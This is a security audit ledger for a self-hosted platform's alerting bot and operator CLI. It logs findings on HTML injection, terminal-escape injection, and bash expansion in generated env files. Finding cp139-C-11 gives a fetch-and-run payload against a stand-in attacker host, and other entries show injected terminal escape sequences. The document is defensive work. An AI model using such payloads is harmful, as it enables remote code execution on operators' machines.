# cp139 deep-deep audit — findings ledger

**Campaign:** Per-workspace file-by-file black-hat walk with chain-op-handler rigor.
**Trigger:** Ken's directive: "I want defense-in-depth that matches the chain-op handler rigor, a deep-deep that treats each workspace's source tree the way phase-A treated each handler: file-by-file, with a black-hat hat on, before declaring it green."
**Started:** 2026-05-25 (post-cp138 close).

cp138 phase-A walked all 17 chain-op handlers deeply with this rigor; cp138 phases B/D/F were partial spot-checks. cp139 closes those gaps systematically.

## Severity bands

- **CRIT** — must fix before any further work
- **HIGH** — must fix this checkpoint
- **MED** — fix this checkpoint
- **LOW** — fix this checkpoint
- **INFO** — note + maybe defensive smoke

## Categories

- SEC — security vulnerability
- ROBUST — defensive-programming gap (crash on edge case, contract violation, missing fallback)
- WIRING — built-but-not-wired / orphan
- DOC — documentation accuracy
- TYPE — type-safety gap
- TEST — smoke coverage gap

---

## Checkpoint A — matrix-bot start + cp138 cleanup (CLOSED 2026-05-25)

### cp139-A-1 SHIPPED (CLEANUP from cp138 standing follow-up) — statement_timeout operator guidance missing

**Where:** OPERATIONS.md §37.8, RUN-A-MORPHIT-NODE.md §11.

**Issue:** cp138 R-3 standing follow-up. Operators had no documented guidance on setting a defense-in-depth `statement_timeout` for the Morphit Postgres database. Pool defaults (`apps/indexer/src/db/pool.ts`) deliberately don't set one to avoid forcing a single value across the indexer worker (block-by-block, sub-second) and ad-hoc psql sessions.

**Fix:** OPERATIONS.md §37.8 sub-item `e.` shipped end-to-end:
- Rationale (defense-in-depth against runaway queries; why pool-level was wrong, why per-database is right)
- Choice-of-value table (30s comfortable, 60s for larger backfills, 0 unsafe)
- Ad-hoc override snippet for psql sessions (`SET statement_timeout = 0; ...; RESET`)
- Verification command (`SHOW statement_timeout`)

RUN-A-MORPHIT-NODE.md §11 hardening summary updated from "Postgres SCRAM + pg_hba" to "Postgres SCRAM + pg_hba + per-database `statement_timeout`". New sentinel in `scripts/operations-hardening-smoke.ts`: `['Postgres statement_timeout', 'statement_timeout']`. Tamper-tested: stripping the keyword fires the smoke with clean error message. REVISIT-LIST entries (the post-cp138 one and the older F-48) both marked SHIPPED with cross-references back to §37.8e.

### cp139-A-2 SHIPPED (LOW, ROBUST) — parseJournalLine crashes on malformed __REALTIME_TIMESTAMP

**Where:** `apps/matrix-bot/src/journalctl.ts:60-63`.

**Issue:** Function's contract says "return null on garbage" but it was unguarded against `Number(j['__REALTIME_TIMESTAMP'])` returning NaN/Infinity. Path:

1. `typeof j['__REALTIME_TIMESTAMP'] === 'string'` — narrows type but doesn't validate parseability.
2. `Number('garbage')` → NaN; `Number('Infinity')` → Infinity; `Number('9000000000000000000000')` → 9e21 (finite but overflows Date range).
3. `new Date(NaN).toISOString()` throws `RangeError: Invalid time value`. Same for Date(Infinity) and Date(overflow).
4. Call site `tailJournalctl` (line 120 of same file) has no outer try/catch on `parseJournalLine(line)`. A single bad journal line would crash the stdout 'data' handler.
5. journalctl child process keeps running; bot's event loop dies. Operator loses alerting silently.

**Reachability:** Practical zero — journald itself produces this field as a microsecond-epoch numeric string, and journald is trusted. But the contract violation is real (function says null-return, throws instead).

**Fix:** Hardened the timestamp parsing with `Number.isFinite()` + Date-range check (`Math.abs(millis) <= 8.64e15` — the documented Date representable range). On any failure, falls back to `new Date().toISOString()` (current time) — same fallback the function already used when `__REALTIME_TIMESTAMP` was absent. Plus a long comment explaining the threat model.

**Sentinel:** New `apps/matrix-bot/scripts/matrix-bot-input-hardening-smoke.ts`, scenarios ME-1 a..e (5 scenarios — garbage, empty, Infinity, overflow, valid). Tamper-tested: reverting the fix fires 3 of 5 scenarios with the actual "Invalid time value" RangeError message that the original code would have produced. (Scenarios b "empty string" passes either way because Number("") === 0 which is finite — the smoke just asserts no-throw, which the original code didn't on that specific path.)

### cp139-A-3 SHIPPED (MED-on-paper, LOW-practical, SEC) — Digest body lacks HTML escape

**Where:** `apps/matrix-bot/src/digest.ts:118-125` (buildDigestBody).

**Issue:** Body construction inlined `${cat}` where `cat = e.module:e.event` directly into the Matrix `formatted_body`:

```ts
htmlLines.push(`<br/><code>${cat}</code>: ${list.length}`);
```

The classifier's `renderAlertBody` is fully audit-hardened (cp17 json_str injection defense, cp18 AUDIT-2 control-char strip, AUDIT-3 MXID-pill defang, AUDIT-4 size caps, AND escapeHtml on every variable interpolated into HTML). The digest path was the lone outlier in the Matrix-HTML emission surface.

**Reachability today:** Zero — Morphit's loggers emit hardcoded `module`/`event` constants. No user-controllable string reaches `cat`. But:

1. If a future logger change accidentally lets user input flow into `event` (e.g. `logger.event(user_input)`), digest XSS fires immediately.
2. The matrix-bot also tails operator-configurable units via `MORPHIT_MATRIX_BOT_JOURNALCTL_UNITS`. An operator who points it at a unit whose `module`/`event` shape they didn't audit could pull in foreign HTML.
3. Defense-in-depth: the classifier already does it; the digest should match.

**Matrix-client side:** Most Matrix clients (Element, FluffyChat) sanitize `formatted_body` via `org.matrix.custom.html` allowlist. But the recommendation in matrix-spec is non-normative — a less-strict client could render the script. Defending at the source is correct.

**Fix:** Exported `escapeHtml` from `classifier.ts` (was a private file-local function); `digest.ts` now imports and applies it to `cat`. `list.length` is already numeric, no escape needed. Plain-text body left unchanged (the `text` msgtype renders literally; only HTML needs escape).

**Sentinel:** Same smoke (cp139-A-2 + cp139-A-3 share one file). Scenarios ME-2 a..e (5 scenarios — script tag, `"`, `'`, `&` no-double-escape, plain-body-unchanged). Tamper-tested: reverting the fix fires 4 of 5 scenarios (the plain-body one always passes since plain is intentionally raw).

**Note:** `escapeHtml` ordering (`&` first, then `<>` etc.) is correct — verified in the function body. Otherwise double-escaping would happen.

**Cumulative smoke state after Checkpoint A:** 5972 → 5983 (+10 from the new smoke, +1 from incidental directory-scan validation by an existing smoke; net consistent).

---

## Checkpoint B — matrix-bot finish (CLOSED 2026-05-25)

### cp139-B-1 SHIPPED (LOW, ROBUST) — drainInfoEvents() hangs the daily digest forever on a corrupt JSON row

**Where:** `apps/matrix-bot/src/state.ts:125` (original) — the line `const events: StructuredAlert[] = rows.map((r) => JSON.parse(r.payload_json))`.

**Issue:** SQLite-backed daily INFO digest:
1. `selectInfo.all()` → array of rows
2. `rows.map(r => JSON.parse(r.payload_json))` — throws on the first corrupt row
3. `stmts.deleteInfo.run()` at the end of the function NEVER EXECUTES if step 2 threw

If even one row has corrupt `payload_json` (operator hand-edit, partial-write recovery from power loss without WAL, a buggy pushInfoEvent in a prior version), the digest schedule fires every 24h, hits the same throw, the digest scheduler's outer try/catch logs `digest send failed:` but the corrupt row is never deleted. **Permanent silent hang** — no INFO digests ever again, no failure that surfaces to the operator (CRITICAL + WARN paths still work).

**Reachability:** Low (operator-side corruption needed) but failure-mode is bad (silent). The fix is trivial.

**Fix:**
- Extracted parsing into `parseInfoRowsTolerantly(rows)` — exported helper that tries `JSON.parse` per row in a try/catch, accumulates good ones, drops bad ones with a stderr log, and emits an aggregate log if any were dropped.
- Production `drainInfoEvents()` delegates to the helper. The DELETE FROM info_events at the end now ALWAYS runs, so a one-time corruption self-heals on the next digest fire.
- Loss of one INFO event = acceptable; permanent loss of all future digests = not.
- Export of the helper also enables unit-level testing without standing up a real better-sqlite3 instance (the sandbox can't build native modules — would otherwise be untestable here).

**Sentinel:** 4 scenarios in `matrix-bot-input-hardening-smoke.ts` (B-1 a..d): corrupt-row-in-middle, all-corrupt-batch, empty-batch, order-preservation. Tamper-tested: reverting the helper to naive `.map(JSON.parse)` fires 2 of 4 scenarios with the exact "Unexpected token..." JSON parser error the bug would have produced in production.

### cp139-B-2 SHIPPED (LOW practical, ROBUST) — StructuredAlert envelope fields unbounded

**Where:** `apps/matrix-bot/src/journalctl.ts:parseJournalLine()` return value construction.

**Issue:** cp18 AUDIT-4 capped payload-details block (`MAX_FIELD_BYTES=1024`, `MAX_PAYLOAD_BYTES=8192`) inside `renderAlertBody`. But the StructuredAlert envelope fields themselves — `module`, `event`, `source`, `ts` — had no length caps. Downstream consumers:

- `renderAlertBody` default-path (no `ALERT_COPY` entry): title is `\`${alert.module} :: ${alert.event}\`` — unbounded.
- `buildDigestBody`: `cat = \`${e.module}:${e.event}\`` — unbounded (now HTML-escaped per ME-2 but still unbounded length).
- `escapeHtml(huge)` then `sendDm(...)` → Matrix sends large message → 65 KiB cap → rejected → operator sees error per such alert. Memory + CPU spent uselessly.

**Reachability:** Practically zero. Morphit's own loggers emit hardcoded short module/event constants. journald itself bounds line size via `LineMax` (default ~48 KiB). But the same threat model as cp18 AUDIT-4 (compromised SIDECAR — host-monitor / smartctl / dmesg / fail2ban / mdadm / dmesg / trivy / postfix / certbot / apt / compose / systemd / journald monitors) does apply to these envelope fields too, since they're attacker-influenceable via the sidecar's structured-log output.

**Fix:** Added `MAX_ENVELOPE_FIELD_BYTES = 256` cap with truncation marker `"…(truncated)"` to all four envelope fields at the parseJournalLine boundary. 256 is generous — 4× the longest current Morphit module:event combined, fits comfortably under Matrix's 65 KiB body cap when rendered. Defending at the parse boundary closes the gap for every downstream consumer in one place.

**Sentinel:** 4 scenarios in `matrix-bot-input-hardening-smoke.ts` (B-2 a..d): 10 KB module, 10 KB event, 10 KB _SYSTEMD_UNIT source, short module unchanged. Tamper-tested: reverting truncEnv fires 3 of 4 scenarios with the input length leaking through verbatim.

### cp139-B-3 SHIPPED (LOW, SEC) — digest-time regex accepted invalid hours 24-29

**Where:** `apps/matrix-bot/src/config.ts:74-77`.

**Issue:** Regex was `/^[0-2]\d:[0-5]\d$/` — accepted `24:00` through `29:59`. `Date.UTC()` silently absorbs overflow (24:00 → midnight next day; 25:00 → 1am next day; 29:00 → 5am next day). An operator who typoed `25:00` thinking it meant "5am" got a digest at 1am next day with no error.

**Reachability:** Operator-self-imposed footgun. Not security per se but UX risks the operator getting alerts at wrong times.

**Fix:** Tightened to `/^(?:[01]\d|2[0-3]):[0-5]\d$/`. Hours 00-23 only. Error message updated to spell out "hour 00-23".

**Sentinel:** 4 scenarios in `matrix-bot-input-hardening-smoke.ts` (B-3 a..d): 24:00 rejected, 29:59 rejected, 23:59 accepted, 00:00 accepted. Tamper-tested: reverting the regex fires 2 of 4 with parseConfig accepting the invalid values.

### cp139-B-4 SHIPPED (LOW, SEC) — homeserver URL accepted any scheme

**Where:** `apps/matrix-bot/src/config.ts:43-46`.

**Issue:** zod's `.url()` validator accepts any URL scheme — `http://`, `https://`, `ftp://`, `gopher://`, `file://`, etc. An operator who copy-pasted `http://matrix.example.com` (typo, drop the `s`) would emit all matrix-bot alert traffic CLEARTEXT to the homeserver — leaking operator alerting metadata (which alert categories fire when, payload contents) to any on-path observer (ISP, transit provider, hostile WiFi).

**Reachability:** Operator-self-imposed but a one-character typo is realistic.

**Fix:** Added `.refine()` requiring `https://` scheme. Exception for localhost loopback addresses (`localhost`, `127.x`, `[::1]`) since some operators run a homeserver on the same machine and don't want TLS overhead for the loopback hop. Updated error message to spell out the rule.

**Sentinel:** 6 scenarios in `matrix-bot-input-hardening-smoke.ts` (B-4 a..f): https:// accepted, http:// public rejected, http://localhost accepted, http://127.0.0.1 accepted, http://[::1] accepted, ftp:// rejected. Tamper-tested: dropping the .refine block fires 2 of 6 (the http://public and ftp:// scenarios).

### Checkpoint B summary

**matrix-bot deep-walk complete. 6 findings total** (ME-1, ME-2, B-1, B-2, B-3, B-4 all shipped). Every source file in `apps/matrix-bot/src/` was walked file-by-file with chain-op-handler rigor:

| File | LOC | Status |
|---|---|---|
| classifier.ts | 1142 | renderAlertBody, sanitize, escapeHtml, matchers, ALERT_COPY scan — clean (modulo ME-2 which is digest-side) |
| config.ts | 156 | B-3, B-4 shipped — clean otherwise |
| digest.ts | 141 | ME-2 shipped — clean otherwise |
| journalctl.ts | 188 | ME-1, B-2 shipped — clean otherwise |
| main.ts | 159 | clean (well-structured entry; all async send paths wrapped in try/catch) |
| matrix.ts | 101 | clean (branded-type defense for MXID vs room-alias; SDK-wrapper is thin and well-bounded) |
| rateLimit.ts | 70 | clean (pure thin wrapper over State; clock-skew defensive) |
| state.ts | 175 | B-1 shipped — clean otherwise (SQL injection-safe via prepared stmts, FK integrity via SQLite, no transaction-leak surfaces) |

**Total scenarios added to smoke battery from cp139 matrix-bot deep-walk: 28 new structural sentinels** in `matrix-bot-input-hardening-smoke.ts`. Every fix tamper-tested.

**Smoke battery after checkpoint B: 6001/6001, 0 failures.** (cp138 close 5972 → 5983 after checkpoint A's 10 sentinels + 1 from incidental directory-scan → 6001 after checkpoint B's 18 additional sentinels.)

---

## Checkpoint C — ops-cli walk (CLOSED 2026-05-25)

### Scope

Walked every source file in `apps/ops-cli/src/` with chain-op-handler rigor: tiny utility files (render/json.ts 13 LOC, lib/ctx.ts 23 LOC, init/encrypt.ts 41 LOC, db.ts 64 LOC, lib/time.ts 81 LOC) plus the heavy lifters (commands/edit.ts 720 LOC, init/render.ts 781 LOC, init/systemCheck.ts 770 LOC, commands/init.ts 530 LOC, commands/upgrade.ts 535 LOC, init/steps.ts 2047 LOC, commands/paymentMethod.ts 507 LOC, commands/status.ts 386 LOC, commands/register.ts 339 LOC, commands/abuse.ts 233 LOC, init/explorerHealth.ts 235 LOC, init/altKeystore.ts 207 LOC, init/prompt.ts 227 LOC, commands/exportAltnetKey.ts 141 LOC, commands/importAltnetKey.ts 193 LOC, commands/loyalty.ts 120 LOC, commands/signups.ts 120 LOC, commands/attestations.ts 109 LOC, commands/drainQueue.ts 163 LOC, commands/flags.ts 166 LOC, commands/failedBroadcasts.ts 124 LOC, commands/status.ts 386 LOC, init/chainCheck.ts 130 LOC, render/term.ts 149 LOC, config.ts 161 LOC, main.ts 392 LOC).

### Theme: terminal-escape injection via external content

Pre-cp139, ops-cli wrote external content (DB rows, RPC responses, file contents, library error messages) directly to the operator's terminal at numerous sites. ANSI/CSI/OSC escape sequences in such content would be interpreted by the operator's terminal as commands (set window title, clear screen, switch to alternate buffer, write to clipboard, hide text) rather than displayed as visible text.

The matrix-bot side had cp18 AUDIT-2 hardening for this (renderAlertBody html-escapes; structured logger sanitizes payload). ops-cli skipped the parallel defense. Checkpoint C added it.

### cp139-C-1 SHIPPED (MED, SEC) — sanitizeForTerm helper + auto-apply

**Where:** `apps/ops-cli/src/render/term.ts`.

**Issue:** info/warn/error/row/section primitives wrote their argument string directly to stdout/stderr without filtering. Every caller across the workspace inherited the bug.

**Fix:** New `sanitizeForTerm(s: string): string` helper that strips:
- C0 control chars (0x00-0x08, 0x0B-0x1F) — BS, FF, VT, etc.
- DEL (0x7F).
- C1 control chars (0x80-0x9F) — 8-bit-mode escape introducers.
- All ESC sequences EXCEPT CSI-SGR (`ESC [ N;N;...m`) — the only sequences `fmt.X` helpers emit.

Preserves: tab (0x09), newline (0x0A), printable ASCII, UTF-8 continuation bytes (>0xA0), CSI-SGR for legitimate color output.

Applied inside all five primitives so every caller that uses `info()`/`warn()`/`error()`/`row()`/`section()` (the entire `commands/abuse.ts`, `flags.ts`, `loyalty.ts`, `drainQueue.ts`, `failedBroadcasts.ts`, `status.ts`, `upgrade.ts`, plus most of `paymentMethod.ts`, `register.ts`) automatically inherits the defense — single point of fix for the bug class.

**Sentinel:** New smoke `apps/ops-cli/scripts/term-sanitize-smoke.ts` — 24 scenarios across (a) sanitizeForTerm direct (16 scenarios covering every dangerous escape class + SGR preservation + UTF-8 + corner cases), (b) term.ts primitives (5 scenarios verifying info/warn/error/row/section auto-apply), (c) cross-file callsites (3 scenarios for renderProbeStatus + renderSystemCheck). Wired in `scripts/run-smokes.sh`. Tamper-tested: reverting sanitizeForTerm body to `return s` fires 18 of 24 scenarios (the 6 SGR-preserved scenarios pass even with no-op because they assert presence-of-SGR which the no-op also passes).

### cp139-C-2 SHIPPED (LOW, ROBUST) — chainCheck.ts null-cast hardening

**Where:** `apps/ops-cli/src/init/chainCheck.ts:lookupBlurtAccount()`.

**Issue:** `const row = result[0] as BlurtAccountRow` — type-cast without runtime null/object guard. If a Blurt RPC endpoint returned `[null]` (or any non-object) as the first array element instead of `[]` for missing accounts, `row.balance` would TypeError. The catch block absorbs it and falls through to the next endpoint, but a hostile upstream serving all 4 fallbacks the same garbage would yield "Could not reach any Blurt RPC" instead of clean "account doesn't exist."

**Fix:** Added runtime `typeof first !== 'object' || first === null` check before cast. Treat non-object as same-as-empty (account not found return).

### cp139-C-3 SHIPPED (MED, SEC) — systemCheck.renderSystemCheck terminal-escape sanitization

**Where:** `apps/ops-cli/src/init/systemCheck.ts:renderSystemCheck()`.

**Issue:** `c.name`, `c.actual`, `c.note` written directly via `console.log` without sanitize. Sources include `/etc/os-release` PRETTY_NAME, sshd_config directive values, journald.conf SystemMaxUse string, net library error messages. A hostile root-equivalent process writing to those files (post-install scripts, package post-trans hooks, attacker who gained brief root access) could plant terminal escapes.

**Fix:** Sanitize c.name + c.actual + c.note inline before each console.log. Added `sanitizeForTerm` import.

### cp139-C-4 SHIPPED (MED, ROBUST) — paymentMethod list DB-row sanitize

**Where:** `apps/ops-cli/src/commands/paymentMethod.ts:runList()`.

**Issue:** DB rows from `instance_payment_methods` (row.key/category/name/description/url) written direct via `console.log`. The indexer's operatorPaymentMethod handler strips C0/C1/DEL via its own NFC-normalize + forbidden-codepoints gate on the way in, but a peer instance replicating chain ops via a compromised replication path could in theory write hostile bytes directly to the DB (bypassing the handler).

**Fix:** Wrap every row.* field in sanitizeForTerm at display. Defense-in-depth — overlaps with the handler-side gate but closes the bug class at display too.

### cp139-C-5 SHIPPED (LOW, SEC) — commands/init.ts err.message paths sanitize

**Where:** `apps/ops-cli/src/commands/init.ts` lines 173 (writeWizardOutput failure), 105 (backup-copy failure).

**Issue:** `err.message` from filesystem errors written via `console.log(`\n✗ ${err.message}`)`. Filesystem error messages can include paths derived from operator's `--out=` flag, which is operator-attacker-influenceable.

**Fix:** Wrap err.message-or-String(err) in sanitizeForTerm at every console.log site.

### cp139-C-6 SHIPPED (LOW, SEC) — commands/edit.ts atomicEnvWrite + fsync error sanitize

**Where:** `apps/ops-cli/src/commands/edit.ts` lines 244, 261 (atomicEnvWrite result.message), 337 (fsync error).

**Issue:** atomicEnvWrite returns `{message: string}` on failure where message contains err.message from filesystem layer (including operator-influenceable paths). Caller's `console.log(`\n✗ ${result.message}`)` would write the raw string.

**Fix:** Wrap result.message in sanitizeForTerm at the caller. Also sanitize fsyncErr.message directly. Added sanitizeForTerm import.

### cp139-C-7 SHIPPED (LOW, SEC) — importAltnetKey err.message sanitize

**Where:** `apps/ops-cli/src/commands/importAltnetKey.ts` 5 err.message console.log sites.

**Issue:** Each catch block emitted `err instanceof Error ? err.message : String(err)` direct.

**Fix:** Bulk-applied sanitizeForTerm wrapper via sed pattern to all 5 sites. Verified by grep that all 5 now use the wrapper.

### cp139-C-8 SHIPPED (LOW, SEC) — register.ts env.error + chain-RPC err.message sanitize

**Where:** `apps/ops-cli/src/commands/register.ts` 3 sites (env.error at line 25-ish in `readEnv`, broadcast err.message, loadPostingKey err.message).

**Issue:** env.error built from env-var validation failures includes the offending env-var VALUE in the error message (e.g. "MORPHIT_INSTANCE_ORIGIN must be https://, got 'http://attacker$\x1b[2J/'"). Broadcast errors carry chain-RPC server response text. loadPostingKey errors carry filesystem text with potentially-injected paths.

**Fix:** Wrap env.error and both errMsg() interpolations in sanitizeForTerm. Also sanitize all `${account}`, `${origin}`, `${instanceName}`, `${contactUrl}` echoes in the printHeader section (defense-in-depth — these passed validation but pass through sanitize for consistency).

### cp139-C-9 SHIPPED (LOW, SEC) — explorerHealth.renderProbeStatus reason sanitize

**Where:** `apps/ops-cli/src/init/explorerHealth.ts:renderProbeStatus()`.

**Issue:** `s.reason` for `kind: 'wrong_shape'` and `kind: 'unreachable'` comes from HTTP server response text (third-party explorer's error body or fetch-library AbortError message). Both interpolated direct into the returned string and later printed via `console.log` in init/steps.ts.

**Fix:** Wrap s.reason in sanitizeForTerm inside renderProbeStatus return values. Added sanitizeForTerm import.

### cp139-C-10 noted (LOW, INFO) — altKeystore.ts passphrasesEqual length leak

**Where:** `apps/ops-cli/src/init/altKeystore.ts:passphrasesEqual()`.

**Issue:** Early-return `if (ba.length !== bb.length) return false` leaks length via timing. Function is dead code (not called from any prod path; kept for parity with relay/keyEnvelope.ts). Not patching since function is unused; flagged for awareness if it's ever wired into a prod path.

### cp139-C-11 SHIPPED (MED, SEC + ROBUST) — quote() switched to single-quote-default for bash-safe sourcing

**Where:** `apps/ops-cli/src/init/render.ts:quote()` and `apps/ops-cli/src/commands/edit.ts:quoteValue()` (mirror).

**Issue:** Previously emitted double-quoted env values with backslash-escape for `\\` and `"`. The README and the wizard's own emitted comment recommend:

```
set -a; . ./morphit.env; set +a; npm start -w apps/indexer
```

This bash-source approach interprets double-quoted values. Operator typing a free-form field (tagline, SEO description, instance name with spaces) containing:
- `$HOME` → expands to literal home dir at source time
- `$(curl evil)` → executes the command at source time
- `` `cmd` `` → executes the command at source time  
- `${var}` → expands the variable at source time
- `!history-expansion` → triggers history expansion

A hostile entity who gets the operator to paste `$(curl http://attacker/exfil.sh | sh)` into the SEO description prompt achieves code execution at the next env-source. Operator-self-imposed footgun but the wizard's emitted output should be source-safe even when free-form input is hostile.

**Fix:** Switched to single-quote-default. Single-quoted strings in POSIX/bash suppress ALL forms of expansion. Embedded apostrophes are escaped via the close-escape-reopen idiom `'\''`. Both render.ts:quote() and edit.ts:quoteValue() updated identically — symmetric write paths must produce symmetric output.

**Sentinel:** 4 scenarios in `init-smoke.ts` + 3 scenarios in `edit-smoke.ts`:
- $HOME in tagline single-quoted
- Command-substitution $(...) single-quoted
- Embedded apostrophe escaped via close-reopen
- Bare-safe values still emit without quotes (compatibility check)
Tamper-tested: reverting to double-quote would fail the 3 of 4 (or 3) hostile-input scenarios with the actual quote shape mismatch.

Also updated 2 existing smoke assertions in init-smoke.ts to match new format (TAGLINE='A test' instead of `"A test"`; matrix-room regex relaxed to accept `['"]?` instead of `"?`).

### cp139-C-12 SHIPPED (LOW, SEC) — steps.ts chain-RPC err.message sanitize

**Where:** `apps/ops-cli/src/init/steps.ts:stepRelayAccount()` line 220 + Coingecko fetcher at line 1685.

**Issue:** Both interpolate `err.message` from chain-RPC / Coingecko HTTP responses (attacker-influenceable via the upstream service) into console.log.

**Fix:** Wrap err.message in sanitizeForTerm at both sites. Also sanitize `account.balance` from chain RPC at line 202. Added sanitizeForTerm import.

### cp139-C-13 SHIPPED (LOW, SEC) — steps.ts operator-typed URL echoes sanitize

**Where:** `apps/ops-cli/src/init/steps.ts:renderHealthChecks()` line 1018 + `editChatLinkUrl()` line 1418.

**Issue:** Operator-typed URLs echoed back as `Current ${label}: ${url}`. URL validators (parseExplorerUrlList, parseRpcEndpoints, parseChatLinkTemplate) check shape via `new URL()` and prefix-startsWith, but don't strip ANSI inside what the URL parser accepts as a "host" or "path" component.

**Fix:** Wrap urls[i] and current in sanitizeForTerm at display.

### cp139-C-14 SHIPPED (LOW, SEC) — commands/init.ts path-echo sanitize

**Where:** `apps/ops-cli/src/commands/init.ts` post-write summary + printNextSteps backup-dir warning + Backup hint keystorePath display.

**Issue:** All paths derived from `resolveOutputPath(ctx.flags.out, defaultRepoRoot())`. Operator's `--out=` flag can carry escape sequences (`--out=$'\x1b[2J/morphit'`). These flow into 6 console.log sites that echo the path back.

**Fix:** Wrap result.configPath, result.envPath, result.keystorePath, result.backupEnvPath, answers.backup.backupDir (in 2 places) in sanitizeForTerm at every output site.

### cp139-C-15 SHIPPED (LOW, SEC) — parseExplorerUrlList + parseRpcEndpoints error-message sanitize

**Where:** `apps/ops-cli/src/init/steps.ts:parseExplorerUrlList()` + `parseRpcEndpoints()`.

**Issue:** URL-validation error strings interpolate operator's raw input (`got "${u}"`). The returned string is later printed via `console.log(`  ✗ ${result}  Try again.`)` by the caller. So a paste containing ANSI escapes that fails URL parsing leaks the escapes through the error display.

**Fix:** Wrap each `${u}` interpolation in sanitizeForTerm inside both parsers. Errors that don't interpolate input are unchanged.

### cp139-C-16 SHIPPED (MED, SEC) — paymentMethod add + remove flag-echo sanitize

**Where:** `apps/ops-cli/src/commands/paymentMethod.ts:runAdd()` + `runRemove()`.

**Issue:** Operator's `--category` flag value echoed in error path; the summary printout (Operator/Action/Key/Name/Description/Category/URL) echoes 6 operator-typed flag values; broadcast result fields (block_num/trx_id) come from chain RPC; err.message paths.

**Fix:** Wrap all 13 sites — category (1), summary (6 in add + 3 in remove), trx_id (2), errMsg() interpolations (4) — in sanitizeForTerm. Note: `name` and `description` already passed through paymentMethod.ts's own `sanitize()` helper which strips C0/C1/DEL/zero-width + RTL-spoofs, so they're double-defended.

### cp139-C-17 SHIPPED (LOW, SEC) — edit.ts printCurrent file-content sanitize

**Where:** `apps/ops-cli/src/commands/edit.ts:printCurrent()` + applyUpdates review loop.

**Issue:** `printCurrent()` displays values from `loadExisting()` which parsed morphit.config.env and morphit.env from disk. An operator who hand-edited their config (or any process with write access to those files) could plant ANSI escapes that fire at next `morphit-ops edit` invocation. Also the review loop interpolates Map values from the wizard's stepX prompts.

**Fix:** Wrap all 11 file-content fields (origin, alt-networks×4, SEO×3, fees-config×3, operator tag, RPC list) + Map values in sanitizeForTerm at display.

### cp139-C-18 SHIPPED (LOW, SEC) — main.ts last-resort fatal handler sanitize

**Where:** `apps/ops-cli/src/main.ts` last-resort `.catch()` handler.

**Issue:** A Promise rejection that escapes main()'s try/finally hits the last-resort handler which writes `err.message` direct to stderr via `process.stderr.write`. Bypasses term.ts which would have auto-sanitized.

**Fix:** Wrap err.message in sanitizeForTerm at the last-resort write. Import sanitizeForTerm at module scope (alongside existing `error as printError, info` imports).

### cp139-C-19 SHIPPED (LOW, SEC) — upgrade.ts release-notes body sanitize

**Where:** `apps/ops-cli/src/commands/upgrade.ts:runUpgrade()` line 183.

**Issue:** Release-notes body from Forgejo HTTP API written line-by-line via `console.log(`  ${line}`)`. Upstream-trusted but not source-control-review-gated (a compromised release-publishing account could plant escapes).

**Fix:** Wrap line in sanitizeForTerm at display. Added sanitizeForTerm import.

### cp139-C-20 SHIPPED (LOW, SEC) — steps.ts chain-RPC balance sanitize

**Where:** `apps/ops-cli/src/init/steps.ts:stepDailyCeiling()` line 395.

**Issue:** `relayAccount.balance` from Blurt RPC interpolated into "Suggestions based on..." console.log. Same threat model as cp139-C-12.

**Fix:** Wrap both account.name and account.balance in sanitizeForTerm at the display site.

### cp139-C-21 noted (LOW, ROBUST) — stepAltNetworks/stepSeo accept any free-form input

**Where:** `apps/ops-cli/src/init/steps.ts:stepAltNetworks()` + `stepSeo()`.

**Issue:** No shape validation on .onion / .loki / .b32.i2p / Nostr-pubkey / SEO-fields prompts. Operator can paste arbitrary text.

**Risk assessment:** Upstream defenses (cp139-C-11 single-quote-default suppresses bash expansion on source; printReview + edit.ts:printCurrent sanitizeForTerm wraps strip terminal escapes at display) eliminate every concrete attack class. Adding shape validation would be UX hardening (catches operator typos earlier) without a security delta.

**Decision:** Logged for the Phase-4 UX-hardening backlog; not blocking cp139 close.

### Checkpoint C summary

**ops-cli deep-walk COMPLETE. 19 cp139-C findings shipped, 1 noted INFO, 1 deferred to Phase 4.**

All findings fit a single bug class — terminal-escape injection via external content reaching the operator's terminal — and a single canonical defense (`sanitizeForTerm`) applied at the term.ts primitives (covers 80% of callers transitively) plus 19 manual-callsite applications at the remaining `console.log`/`process.stderr.write` paths.

cp139-C-11 (quote single-quote-default) is the standout finding — distinct bug class (bash $-expansion on source vs terminal-escape injection), MED severity (concrete operator footgun, not theoretical), and required mirroring across init/render.ts:quote() + edit.ts:quoteValue() to keep symmetric write paths producing symmetric env-file output.

cp139-C-2 (chainCheck null-cast) is the only non-sanitize cp139-C finding — ROBUST not SEC.

**Total scenarios added in checkpoint C: 31** — 24 in term-sanitize-smoke + 4 in init-smoke (cp139-C-11 bash-safety) + 3 in edit-smoke (cp139-C-11 mirror).

**Smoke battery after checkpoint C: 6032/6032, 0 failures**, three pulses confirmed identical (pulses 6, 7, 8 in this turn).

**TypeScript: 0 errors across all 10 tsconfigs** at every typecheck during checkpoint C.

---

## Checkpoint D — packages/* walk (IN-PROGRESS)

### Files walked

| Package | LOC | Files | Status |
|---|---|---|---|
| operator-config | 487 | index.ts (368) + matrixAddress.ts (119) | **WALKED** — 1 finding (D-2) |
| asset-registry | 1135 | index.ts | **WALKED** — pure data + lookups, no I/O |
| indexer-client | 946 | index.ts | **WALKED** — pure type declarations |
| relay-client | 308 | index.ts | **WALKED** — pure type declarations |

### cp139-D-1 SHIPPED (HIGH, SEC) — quote() per-consumer split

**Where:** `apps/ops-cli/src/init/render.ts:quote()` and `apps/ops-cli/src/commands/edit.ts:quoteValue()` (mirror).

**Issue:** Discovered while walking `packages/operator-config/src/index.ts`. cp139-C-11 switched both `quote()` and `quoteValue()` to single-quote-default to suppress bash expansion when operators source the env file via `set -a; . ./morphit.env`. The fix was correct for the bash consumer.

But `morphit.config.env` is read by `node:util.parseEnv` (via the `@morphit/operator-config` package's `loadOperatorConfig()`). And Node's `parseEnv` does NOT support the POSIX `'\''` close-escape-reopen idiom that cp139-C-11's quote() emits for embedded apostrophes.

Concrete failure mode: operator's wizard input `"Berlin's first Morphit node."` (which `stepTagline` literally suggests as an example in the wizard's prompt copy) was being serialized as `MORPHIT_INSTANCE_TAGLINE='Berlin'\''s first Morphit node.'`. At indexer/relay boot, `parseEnv` reads this and returns `'Berlin'` — silently truncates at the first inner apostrophe. Operator's tagline becomes literally `"Berlin"` on the homepage. The serialize→parse round-trip was lossy by design after cp139-C-11.

The wizard surface is broad: tagline, SEO title/description/keywords, instance name (when contains apostrophe), contact URL (rare), and any operator-tunable field that ends up in morphit.config.env.

**Fix (v2):** `quote()` and `quoteValue()` now take a `consumer: 'parseEnv' | 'bash'` arg.

